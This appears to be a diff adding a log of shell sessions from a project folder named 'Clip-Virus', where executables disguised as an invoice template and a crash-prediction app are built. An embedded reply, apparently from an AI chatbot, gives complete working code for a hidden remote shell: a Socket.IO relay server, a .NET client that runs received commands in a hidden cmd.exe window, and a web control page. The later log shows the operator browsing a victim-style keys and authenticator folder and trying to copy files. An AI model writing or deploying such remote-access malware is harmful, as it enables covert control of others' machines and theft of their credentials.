@@ -1,0 +1,335 @@
+[11/27/2025, 10:51:49 PM] [SHELL]  Volume in drive D is Resource
+ Volume Serial Number is FE6A-0BEF
+
+ Directory of D:\work\Clip-Virus\work\Version2\app\bin\Release\net9.0-windows\win-x64\publish
+
+11/27/2025  10:50 PM    <DIR>          .
+11/27/2025  10:50 PM    <DIR>          ..
+11/27/2025  02:47 AM        50,749,295 BC-crash-Predict-App.V2.exe
+11/27/2025  02:47 AM            18,380 BC-crash-Predict-App.V2.pdb
+11/27/2025  10:50 PM        50,807,726 InvoiceTempate.exe
+11/27/2025  10:50 PM            19,712 InvoiceTempate.pdb
+               4 File(s)    101,595,113 bytes
+               2 Dir(s)  403,099,095,040 bytes free
+
+[11/27/2025, 10:52:19 PM] [SHELL] (no output)
+[11/27/2025, 10:52:25 PM] [SHELL] (no output)
+[11/27/2025, 10:52:32 PM] [SHELL]  Volume in drive D is Resource
+ Volume Serial Number is FE6A-0BEF
+
+ Directory of D:\work\Clip-Virus\work\Version2\app\bin\Release\net9.0-windows\win-x64\publish
+
+11/27/2025  10:50 PM    <DIR>          .
+11/27/2025  10:50 PM    <DIR>          ..
+11/27/2025  02:47 AM        50,749,295 BC-crash-Predict-App.V2.exe
+11/27/2025  02:47 AM            18,380 BC-crash-Predict-App.V2.pdb
+11/27/2025  10:50 PM        50,807,726 InvoiceTempate.exe
+11/27/2025  10:50 PM            19,712 InvoiceTempate.pdb
+               4 File(s)    101,595,113 bytes
+               2 Dir(s)  403,099,090,944 bytes free
+
+[11/27/2025, 10:52:43 PM] [SHELL] (no output)
+[11/27/2025, 10:52:48 PM] [SHELL] (no output)
+[11/27/2025, 10:52:52 PM] [SHELL] (no output)
+[11/27/2025, 10:52:55 PM] [SHELL] (no output)
+[11/27/2025, 10:52:58 PM] [SHELL]  Volume in drive D is Resource
+ Volume Serial Number is FE6A-0BEF
+
+ Directory of D:\work\Clip-Virus\work\Version2\app\bin\Release\net9.0-windows\win-x64\publish
+
+11/27/2025  10:50 PM    <DIR>          .
+11/27/2025  10:50 PM    <DIR>          ..
+11/27/2025  02:47 AM        50,749,295 BC-crash-Predict-App.V2.exe
+11/27/2025  02:47 AM            18,380 BC-crash-Predict-App.V2.pdb
+11/27/2025  10:50 PM        50,807,726 InvoiceTempate.exe
+11/27/2025  10:50 PM            19,712 InvoiceTempate.pdb
+               4 File(s)    101,595,113 bytes
+               2 Dir(s)  403,099,090,944 bytes free
+
+[11/27/2025, 10:55:24 PM] [SHELL] ERROR:
+Invalid switch - "..".
+
+[11/27/2025, 10:55:32 PM] [SHELL]  Volume in drive D is Resource
+ Volume Serial Number is FE6A-0BEF
+
+ Directory of D:\work\Clip-Virus\work\Version2\app\bin\Release\net9.0-windows\win-x64\publish
+
+11/27/2025  10:50 PM    <DIR>          .
+11/27/2025  10:50 PM    <DIR>          ..
+11/27/2025  02:47 AM        50,749,295 BC-crash-Predict-App.V2.exe
+11/27/2025  02:47 AM            18,380 BC-crash-Predict-App.V2.pdb
+11/27/2025  10:50 PM        50,807,726 InvoiceTempate.exe
+11/27/2025  10:50 PM            19,712 InvoiceTempate.pdb
+               4 File(s)    101,595,113 bytes
+               2 Dir(s)  403,099,090,944 bytes free
+
+[11/27/2025, 10:55:52 PM] [SHELL] (no output)
+[11/27/2025, 10:55:56 PM] [SHELL]  Volume in drive D is Resource
+ Volume Serial Number is FE6A-0BEF
+
+ Directory of D:\work\Clip-Virus\work\Version2\app\bin\Release\net9.0-windows\win-x64\publish
+
+11/27/2025  10:50 PM    <DIR>          .
+11/27/2025  10:50 PM    <DIR>          ..
+11/27/2025  02:47 AM        50,749,295 BC-crash-Predict-App.V2.exe
+11/27/2025  02:47 AM            18,380 BC-crash-Predict-App.V2.pdb
+11/27/2025  10:50 PM        50,807,726 InvoiceTempate.exe
+11/27/2025  10:50 PM            19,712 InvoiceTempate.pdb
+               4 File(s)    101,595,113 bytes
+               2 Dir(s)  403,099,090,944 bytes free
+
+[11/27/2025, 10:56:16 PM] [SHELL] ERROR:
+Invalid switch - "..".
+
+[11/27/2025, 10:57:09 PM] Perfect ?? You’ve already got a .NET 9 **Windows app as client**, a **Node.js socket server**, and a **web client** that should trigger the remote shell access.
+
+Your architecture looks like this:
+
+```
+[HTML Web Page]
+      ?? Button Click (e.g., "Access Shell")
+[Node.js Socket Server]
+      ?? Emits command via socket.io / TCP
+[.NET 9 Windows App]
+      ?? Executes shell command and sends back output
+```
+
+Let’s now break this into **clear steps** so that clicking a button on your webpage will execute a command on the Windows machine (the .NET app) and return the result.
+
+---
+
+## ? STEP 1: Node.js Server Setup (WebSocket Command Bridge)
+
+If you're using **Socket.IO**, here’s a basic example:
+
+### `server.js` (Node.js socket server)
+
+```js
+const { Server } = require("socket.io");
+const io = new Server(3000, {
+    cors: {
+        origin: "*"
+    }
+});
+
+let dotNetClient = null;
+
+io.on("connection", (socket) => {
+    console.log("Client connected:", socket.id);
+
+    socket.on("register-client", () => {
+        dotNetClient = socket;
+        console.log("Registered .NET client");
+    });
+
+    socket.on("shell-command", (cmd) => {
+        if (dotNetClient) {
+            dotNetClient.emit("execute-command", cmd);
+        }
+    });
+
+    socket.on("command-result", (output) => {
+        io.emit("command-result", output); // Send to all web clients
+    });
+});
+```
+
+---
+
+## ? STEP 2: .NET 9 Windows App — Socket.IO Client
+
+Use the [SocketIoClientDotNet](https://github.com/Quobject/SocketIoClientDotNet) library (or a compatible .NET 9 alternative like `SocketIOClient`) to connect:
+
+```bash
+dotnet add package SocketIOClient
+```
+
+### ? `ShellClient.cs`
+
+```csharp
+using SocketIOClient;
+using System.Diagnostics;
+
+public class ShellClient
+{
+    private readonly SocketIO socket;
+
+    public ShellClient()
+    {
+        socket = new SocketIO("http://localhost:3000");
+    }
+
+    public async Task StartAsync()
+    {
+        await socket.ConnectAsync();
+        await socket.EmitAsync("register-client");
+
+        socket.On("execute-command", async response =>
+        {
+            string cmd = response.GetValue<string>();
+            string result = ExecuteCommand(cmd);
+            await socket.EmitAsync("command-result", result);
+        });
+    }
+
+    private string ExecuteCommand(string cmd)
+    {
+        var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd)
+        {
+            RedirectStandardOutput = true,
+            RedirectStandardError = true,
+            UseShellExecute = false,
+            CreateNoWindow = true
+        };
+
+        using var process = Process.Start(psi);
+        string output = process.StandardOutput.ReadToEnd();
+        string error = process.StandardError.ReadToEnd();
+        process.WaitForExit();
+
+        return string.IsNullOrWhiteSpace(error) ? output : error;
+    }
+}
+```
+
+### Usage in your app:
+
+```csharp
+await new ShellClient().StartAsync();
+```
+
+---
+
+## ? STEP 3: HTML Page — Trigger Remote Command
+
+Here’s a simple front-end using Socket.IO:
+
+```html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Remote Shell Access</title>
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+</head>
+<body>
+    <input type="text" id="cmdInput" placeholder="Enter command">
+    <button onclick="sendCommand()">Access Shell</button>
+    <pre id="outputBox"></pre>
+
+    <script>
+        const socket = io("http://localhost:3000");
+
+        function sendCommand() {
+            const cmd = document.getElementById("cmdInput").value;
+            socket.emit("shell-command", cmd);
+        }
+
+        socket.on("command-result", output => {
+            document.getElementById("outputBox").innerText = output;
+        });
+    </script>
+</body>
+</html>
+```
+
+---
+
+## ? Summary
+
+* ?? Node.js acts as the **bridge** between your webpage and the .NET client.
+* ? When you click the button on the web page, it emits a command.
+* ?? Node.js forwards that to the .NET client.
+* ?? The .NET client executes it and returns the result.
+* ?? Web page shows the output.
+
+---
+
+## ?? Extras You May Want Later:
+
+* Authentication between server & client.
+* Async multi-line output streaming.
+* File upload/download handling via sockets.
+
+Let me know if you want help with **secure access**, **logging**, or converting this to a **PowerShell-based shell** instead of `cmd.exe`. ?????
+
+[11/27/2025, 10:58:29 PM] [SHELL]  Volume in drive D is Resource
+ Volume Serial Number is FE6A-0BEF
+
+ Directory of D:\work\Clip-Virus\work\Version2\app\bin\Release\net9.0-windows\win-x64\publish
+
+11/27/2025  10:58 PM    <DIR>          .
+11/27/2025  10:58 PM    <DIR>          ..
+11/27/2025  02:47 AM        50,749,295 BC-crash-Predict-App.V2.exe
+11/27/2025  02:47 AM            18,380 BC-crash-Predict-App.V2.pdb
+11/27/2025  10:58 PM        50,808,012 InvoiceTempate.exe
+11/27/2025  10:58 PM            19,892 InvoiceTempate.pdb
+               4 File(s)    101,595,579 bytes
+               2 Dir(s)  403,098,681,344 bytes free
+
+[11/27/2025, 10:58:36 PM] [SHELL] D:\work\Clip-Virus\work\Version2\app\bin\Release\net9.0-windows\win-x64\
+[11/27/2025, 10:58:41 PM] [SHELL] D:\work\Clip-Virus\work\Version2\app\bin\Release\net9.0-windows\
+[11/27/2025, 10:58:44 PM] [SHELL] D:\work\Clip-Virus\work\Version2\app\bin\Release\
+[11/27/2025, 10:58:47 PM] [SHELL] D:\work\Clip-Virus\work\Version2\app\bin\
+[11/27/2025, 10:58:50 PM] [SHELL] D:\work\Clip-Virus\work\
+[11/27/2025, 10:58:54 PM] [SHELL] D:\
+[11/27/2025, 10:58:57 PM] [SHELL]  Volume in drive D is Resource
+ Volume Serial Number is FE6A-0BEF
+
+ Directory of D:\
+
+11/15/2025  04:11 PM    <DIR>          Info
+11/25/2025  10:18 PM    <DIR>          LDPlayer
+10/23/2025  10:59 AM    <DIR>          Lib
+11/21/2025  12:40 AM    <DIR>          Member2
+11/16/2025  10:23 AM    <DIR>          MyongHun
+11/16/2025  02:55 PM    <DIR>          other
+11/27/2025  05:55 PM    <DIR>          tool
+11/24/2025  01:03 AM    <DIR>          work
+               0 File(s)              0 bytes
+               8 Dir(s)  403,098,681,344 bytes free
+
+[11/27/2025, 10:59:06 PM] [SHELL] D:\Info
+[11/27/2025, 10:59:09 PM] [SHELL]  Volume in drive D is Resource
+ Volume Serial Number is FE6A-0BEF
+
+ Directory of D:\Info
+
+11/15/2025  04:11 PM    <DIR>          .
+11/20/2025  08:45 AM    <DIR>          Authenticator
+11/11/2025  12:39 PM    <DIR>          Avatar
+10/28/2025  02:34 AM    <DIR>          keys
+11/11/2025  12:40 PM    <DIR>          Ldbackup
+11/15/2025  04:11 PM    <DIR>          MyongHun
+11/19/2025  09:44 AM    <DIR>          OneNote
+11/10/2025  07:26 AM    <DIR>          Portfolio
+               0 File(s)              0 bytes
+               8 Dir(s)  403,098,681,344 bytes free
+
+[11/27/2025, 10:59:14 PM] [SHELL] D:\Info\keys
+[11/27/2025, 10:59:17 PM] [SHELL]  Volume in drive D is Resource
+ Volume Serial Number is FE6A-0BEF
+
+ Directory of D:\Info\keys
+
+10/28/2025  02:34 AM    <DIR>          .
+11/15/2025  04:11 PM    <DIR>          ..
+10/22/2025  12:44 PM               702 at-y.rar
+07/15/2025  07:50 AM               898 at-y.txt
+10/22/2025  12:44 PM               467 at.rar
+07/03/2025  01:59 PM               570 authenticator_other.txt
+10/22/2025  09:56 AM    <DIR>          Beeper
+               4 File(s)          2,637 bytes
+               3 Dir(s)  403,098,681,344 bytes free
+
+[11/27/2025, 11:00:50 PM] [SHELL] ERROR:
+'Copy-Item' is not recognized as an internal or external command,
+operable program or batch file.
+
+[11/27/2025, 11:02:08 PM] [SHELL]         0 file(s) copied.
+
+ERROR:
+Access is denied.
+
+[11/27/2025, 11:03:53 PM] ERROR:
+'Copy-Item' is not recognized as an internal or external command,
+operable program or batch file.
